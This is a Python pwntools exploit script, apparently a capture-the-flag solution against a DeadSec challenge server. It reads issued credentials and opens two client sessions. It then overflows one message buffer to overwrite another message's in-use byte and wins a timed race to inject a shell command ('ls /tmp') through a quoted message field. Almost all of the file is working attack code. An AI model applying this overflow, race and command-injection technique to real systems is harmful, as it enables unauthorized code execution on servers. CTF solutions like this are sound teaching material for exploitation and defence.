#!/usr/bin/env python3

from pwn import *
import time

#client = ELF("bin/client")
#exe = ELF("bin/server")

#context.binary = exe


def conn():
    if args.LOCAL:
        #r = process([exe.path])
        #if args.DEBUG:
        #    gdb.attach(r)
        return
    else:
        r = remote("netcat.deadsec.quest", 32471)

    return r


def main():
    r = conn()
    client1 = remote("netcat.deadsec.quest", 32555)
    client2 = remote("netcat.deadsec.quest", 32555)
    # good luck pwning :)
    r.recvuntil(': ')
    id = int(r.recvline().strip())
    r.recvuntil(": ")
    password = r.recvline().strip().decode()
    log.info(f"ID: {id}\nPASSWORD: {password}")

    #init client1
    client1.sendlineafter(":",f"{id}");
    client1.sendlineafter(":",f"{password}");
    client1.sendlineafter(":","FOO");

    #init client2
    client2.sendlineafter(":",f"{id}");
    client2.sendlineafter(":",f"{password}");
    client2.sendlineafter(":","BAR");

    #at this point both messages have an allocated space
    client1.sendlineafter(">", "A"*0xe7) #send a full message to overwrite the in use byte of client2's message 
    #this makes it so that it will select the same space as client2 for the next message

    client2.sendlineafter(">", '!fmt \\nlife could be a dream') #send the message so the in use byte is set to send, now the server will check the message 

    #wait until FILTER, marks the start of parsing. wait 1.2 seconds for the race con
    r.recvuntil("FILTER")
    time.sleep(1.2)

    #overwrite the shared memory
    client1.sendline("!fmt hello';ls /tmp;echo 'world")

    client2.interactive()


if __name__ == "__main__":
    main()
